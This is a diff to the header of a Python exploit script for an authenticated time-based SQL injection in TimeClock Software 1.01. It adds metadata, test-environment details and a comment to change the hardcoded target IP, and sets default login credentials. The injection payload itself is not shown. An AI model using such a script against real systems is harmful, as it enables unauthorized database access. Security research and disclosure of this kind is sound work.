@@ -1,19 +1,19 @@
 #!/usr/bin/python3
 
-# Exploit Title: TimeClock Software 1.01 Time-Based SQL Injection
+# Exploit Title: TimeClock Software 1.01 Authenticated Time-Based SQL Injection
 # Date: July 21, 2020
 # Exploit Author: François Bibeau
-# Co Author: Tyler Butler
+# Co Author: Tyler Butler, http://tbutler.org, https://twitter.com/tbutler0x90
 # Vendor Homepage: http://timeclock-software.net/
 # Software Link: http://timeclock-software.net/timeclock-download.php
 # Version: 1.01
-# Tested on: Ubuntu 18.04.3 (LTS) x64
+# Tested on: Ubuntu 18.04.3 (LTS) x64, mysql 5.7, php 7.2.1-apache
 
 import time
 import requests
 
 
-login_url = 'http://159.203.41.34/login_action.php'
+login_url = 'http://159.203.41.34/login_action.php'    # Change ip to application ip 
 login_data = {'username':'fred','password':'fred','submit':'Log In'}
 headers = {'User-Agent': 'Mozilla/5.0'}
 
